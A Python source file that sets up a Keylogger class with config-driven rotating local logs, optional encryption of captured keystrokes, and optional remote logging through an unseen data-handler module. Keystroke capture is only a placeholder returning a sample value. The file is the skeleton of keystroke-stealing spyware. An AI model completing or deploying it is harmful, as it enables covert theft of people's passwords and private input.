import os
import time
import logging
from logging.handlers import RotatingFileHandler
from core.data_handler import DataHandler
from config.loader import ConfigLoader

class Keylogger:
    def __init__(self):
        config = ConfigLoader.load_config()
        self.log_file = config["logging"]["file_path"]
        self.encryption_enabled = config["encryption"]["enabled"]
        self.storage_path = config["storage"]["local"]["path"]
        self.remote_logging_enabled = config["storage"]["remote"]["enabled"]
        self.data_handler = DataHandler()

        # Set up local logging with rotation
        self.logger = logging.getLogger("Keylogger")
        self.logger.setLevel(logging.INFO)
        handler = RotatingFileHandler(self.log_file, maxBytes=config["logging"]["rotation"]["max_bytes"],
                                      backupCount=config["logging"]["rotation"]["backup_count"])
        self.logger.addHandler(handler)
        
        # Optionally encrypt the log
        if self.encryption_enabled:
            self.data_handler.enable_encryption()

    def start_logging(self):
        try:
            print("Starting key logging...")
            while True:
                keystroke = self._capture_keystroke()
                self._process_keystroke(keystroke)
                time.sleep(0.1)
        except KeyboardInterrupt:
            print("Stopping key logging.")

    def _capture_keystroke(self):
        # Placeholder for platform-specific keystroke capture logic
        return "sample_key"

    def _process_keystroke(self, keystroke):
        if self.encryption_enabled:
            keystroke = self.data_handler.encrypt_data(keystroke)
        
        self.logger.info(f"Keystroke: {keystroke}")
        
        # Remote logging if enabled
        if self.remote_logging_enabled:
            self.data_handler.remote_log(keystroke)
